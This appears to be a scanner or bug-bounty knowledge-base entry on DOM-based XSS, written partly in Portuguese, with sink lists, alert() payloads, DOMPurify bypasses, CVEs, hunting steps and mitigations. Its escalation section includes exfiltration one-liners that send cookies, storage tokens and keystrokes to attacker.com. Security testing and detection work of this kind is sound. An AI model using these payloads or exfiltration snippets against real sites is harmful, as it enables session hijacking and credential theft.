---
id: dom_sink_detection
title: "Dangerous DOM Sinks in JavaScript"
module: "domsinks"
severity: "MEDIUM"
cwe_id: "CWE-79"
cwe_title: "Improper Neutralization of Input During Web Page Generation (XSS)"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
vrt_id: "cross_site_scripting_xss.dom_based"
---

## Summary
Dangerous DOM sink functions (innerHTML, eval, document.write) detected in JavaScript source code indicate potential DOM-based XSS vulnerabilities when user-controlled data flows into these sinks.

## Description
DOM-based XSS occurs when client-side JavaScript writes user-controlled data to dangerous sinks without sanitization. Common dangerous sinks include:

- element.innerHTML / element.outerHTML -- injects parsed HTML
- eval() / Function() / setTimeout(string) / setInterval(string) -- executes arbitrary code
- document.write() / document.writeln() -- rewrites page content
- location.href / location.assign() / location.replace() -- navigates to attacker URL
- jQuery .html() / .append() with unsanitized input

When data from sources like location.hash, location.search, document.referrer, postMessage, or URL fragments flows into these sinks without encoding, attackers can inject and execute arbitrary JavaScript.

## Impact
- Session hijacking via cookie theft
- Account takeover through credential harvesting
- Defacement of the application interface
- Redirection to phishing pages
- Keystroke logging and form data exfiltration

## Payloads and Bypasses
Payloads para DOM XSS via diferentes sinks:
```javascript
// innerHTML/outerHTML
element.innerHTML = location.hash.slice(1);
// Payload: https://target/#<img src=x onerror=alert(document.domain)>

// document.write / writeln
document.write('<h1>' + decodeURIComponent(location.search.split('q=')[1]) + '</h1>');
// Payload: ?q=<script>alert(document.domain)</script>

// eval / Function / setTimeout(string)
eval(location.hash.slice(1));
setTimeout('alert(' + userInput + ')', 0);
new Function('return ' + userInput)();
// Payload: #alert(document.cookie)

// location sinks (open redirect / javascript: URI)
location.href = params.get('next');
location.assign(params.get('url'));
window.open(params.get('redirect'));
// Payload: ?next=javascript:alert(document.domain)

// jQuery sinks
$('#output').html(location.hash);
$('#output').append(userInput);
$(userInput);  // jQuery selector injection
$.globalEval(userInput);
// Payload: #<img src=x onerror=alert(1)>

// postMessage sink
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});
// Payload: window.postMessage('<img src=x onerror=alert(1)>','*')
```

Sources controladas pelo atacante:
```javascript
// URL-based sources
location.hash          // #payload (nao enviado ao servidor)
location.search        // ?param=payload
location.href          // URL completa
location.pathname      // /path/payload
document.URL           // URL completa do documento
document.documentURI   // similar a document.URL
document.baseURI       // base URL do documento

// Outros sources
document.referrer      // header Referer
document.cookie        // cookies acessiveis via JS
window.name            // persistente entre navegacoes
postMessage            // mensagens cross-origin
Web Storage            // localStorage / sessionStorage (se atacante controlou antes)
```

Bypass de DOMPurify e sanitizadores:
```html
<!-- mXSS (mutation XSS) -- DOMPurify < 2.5.0 / < 3.1.3 (CVE-2024-47875) -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
<!-- Nesting depth bypass (CVE-2024-45801) -->
<!-- Payloads profundamente aninhados que excedem o limite de depth check -->

<!-- Prototype pollution + DOMPurify bypass -->
<!-- Se atacante consegue poluir Object.prototype antes da sanitizacao -->
constructor.prototype.innerHTML = '<img src=x onerror=alert(1)>'
__proto__.source = '<img src=x onerror=alert(1)>'
```

Payloads especificos por contexto DOM:
```javascript
// Context: innerHTML com encoding bypass
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>

// Context: eval / Function
';alert(1)//
');alert(1)//
1;alert(1)
[].constructor.constructor('alert(1)')()

// Context: location / URL
javascript:alert(1)
javascript:alert(1)//http://legit.com
data:text/html,<script>alert(1)</script>
//attacker.com

// Context: jQuery selector
<img src=x onerror=alert(1)>
#<img/src=x onerror=alert(1)>

// Context: framework bypass
// Vue.js v-html
{{constructor.constructor('alert(1)')()}}
// React dangerouslySetInnerHTML
{"__html":"<img src=x onerror=alert(1)>"}
// Angular bypass
<div [innerHTML]="'<img src=x onerror=alert(1)>'">
```

## Target Context (Crawler Hints)
- **Parameters:** `q`, `search`, `query`, `redirect`, `url`, `callback`, `next`, `return`, `goto`, `msg`, `message`, `error`, `template`, `content`, `html`
- **Paths:** `/search`, `/redirect`, `/callback`, `/oauth/callback`, `/login`, `/error`, `/404`, `/share`, `/embed`, `/preview`, `/#/`

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2024-47875 | DOMPurify | 2024 | mXSS (mutation XSS) via nesting de elementos math/form -- bypass completo do sanitizador em versoes < 2.5.0 e < 3.1.3 | Sanitizer bypass (mXSS) |
| CVE-2024-45801 | DOMPurify | 2024 | Bypass do nesting-depth check permitindo XSS via payloads profundamente aninhados -- afeta Confluence e outros | Nesting depth bypass |
| CVE-2020-11022 | jQuery | 2020 | XSS via HTML passado para metodos de manipulacao DOM (.html(), .append()) quando input contem elementos especiais | jQuery DOM XSS |
| CVE-2020-11023 | jQuery | 2020 | XSS via .html() com elementos option em contextos especificos -- afeta jQuery < 3.5.0 | jQuery DOM XSS |
| CVE-2023-29017 | vm2 (Node.js) | 2023 | Sandbox escape via manipulacao de prototipos -- relevante para aplicacoes que usam eval em contexto sandboxed | Sandbox escape (eval) |
| CVE-2024-4367 | Mozilla PDF.js | 2024 | XSS via rendering de fonte em PDF -- sink eval em processamento de glyph, afeta Firefox e qualquer app usando PDF.js | Arbitrary JS execution |

## Escalation Techniques
- **Session hijacking:** se `HttpOnly` nao esta setado nos cookies de sessao, extrair via `document.cookie` e enviar para servidor do atacante -- `new Image().src='https://attacker.com/steal?c='+document.cookie`.
- **Token theft de localStorage/sessionStorage:** SPAs frequentemente armazenam JWT ou access tokens em Web Storage -- DOM XSS permite `fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))`.
- **Keylogging e credential harvesting:** injetar event listener via DOM XSS para capturar keystrokes em campos de login -- `document.addEventListener('keypress', e => fetch('https://attacker.com/log?k='+e.key))`.
- **Phishing inline:** usar `innerHTML` para substituir conteudo da pagina com formulario de login falso -- vitima insere credenciais pensando estar na pagina legitima.
- **Encadeamento com CSRF:** DOM XSS permite executar requests autenticados sem token CSRF -- `fetch('/api/change-email', {method:'POST', body:'email=attacker@evil.com', credentials:'include'})`.
- **Worm XSS:** em contextos stored, o payload pode se auto-propagar (ex.: injetar em perfil que e renderizado para outros usuarios via innerHTML, cada visualizacao propaga a infeccao).

## Hunting Methodology
1. Obter todos os JS bundles da aplicacao (incluindo lazy-loaded chunks) -- usar o modulo JsAnalyzer ou ferramentas como `linkfinder`, `getJS`.
2. Buscar por sinks perigosos no codigo-fonte: `innerHTML`, `outerHTML`, `document.write`, `eval`, `Function(`, `setTimeout(` com string, `setInterval(` com string, `location.href =`, `location.assign(`, `$.html(`, `$.append(`, `v-html`.
3. Para cada sink encontrado, rastrear o fluxo de dados (taint tracking manual): identificar se algum source controlavel pelo atacante (`location.hash`, `location.search`, `postMessage`, `document.referrer`, `window.name`) alcanca o sink sem sanitizacao.
4. Filtrar falsos positivos: sinks alimentados por strings estaticas/hardcoded nao sao exploitaveis. Verificar se ha concatenacao com dados dinamicos.
5. Verificar se o sink esta dentro de lookback range (~500 chars) de um data source indicator (fetch, response, $fetch, location, URL, searchParams).
6. Para sinks confirmados com source controlavel, construir PoC: URL com payload no hash/search, ou HTML que envia postMessage.
7. Testar no browser com CSP desabilitado primeiro, depois com CSP ativo para verificar se o CSP bloqueia a execucao.
8. Verificar source maps (`.map` files) -- se disponiveis, facilitam enormemente o taint tracking e identificacao de fluxos source-to-sink.

## False Positive Indicators
- Sink alimentado por string literal/hardcoded (ex.: `el.innerHTML = "<div class='wrapper'>"`): nao e exploitavel pois nao ha input do usuario.
- eval() usado internamente pelo framework para template compilation (Angular, Vue): pattern conhecido e seguro no contexto do framework.
- document.write usado em scripts de analytics/tracking carregados de CDN confiavel: nao aceita input do usuario.
- innerHTML com DOMPurify.sanitize() aplicado antes da atribuicao: o sanitizer remove payloads perigosos. Verificar versao.
- Sink esta em codigo morto (funcao nunca chamada, feature flag desabilitado): nao ha path de execucao.
- setTimeout/setInterval com function reference (nao string): `setTimeout(fn, 100)` e seguro; apenas `setTimeout("string", 100)` e perigoso.
- Framework com auto-escaping habilitado (React JSX `{}`, Vue `{{ }}`, Angular template binding) -- excecao: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`.

## Recommendation
1. Substituir `innerHTML` por `textContent` para insercao de texto puro -- elimina parsing de HTML.
2. Usar DOMPurify (versao mais recente) para todo HTML que precisa ser renderizado dinamicamente -- configurar `ALLOWED_TAGS` e `ALLOWED_ATTR` restritivos.
3. Eliminar `eval()`, `Function()`, `setTimeout(string)` e `setInterval(string)` -- usar `JSON.parse()` para dados e funcoes nomeadas para callbacks.
4. Implementar Content-Security-Policy com `script-src` restritivo (nonce-based ou strict-dynamic) para mitigar impacto de DOM XSS.
5. Usar APIs seguras dos frameworks: `textContent`, `v-text` (Vue), `{}` (React JSX), interpolacao padrao (Angular) em vez de APIs que parseiam HTML.
6. Validar `event.origin` em TODOS os handlers de `postMessage` antes de usar `event.data`.
7. Implementar Trusted Types API para prevenir injection em sinks DOM perigosos a nivel de browser.
8. Auditar JS bundles regularmente com ferramentas de analise estatica (ESLint security plugins, Semgrep) para detectar novos sinks.
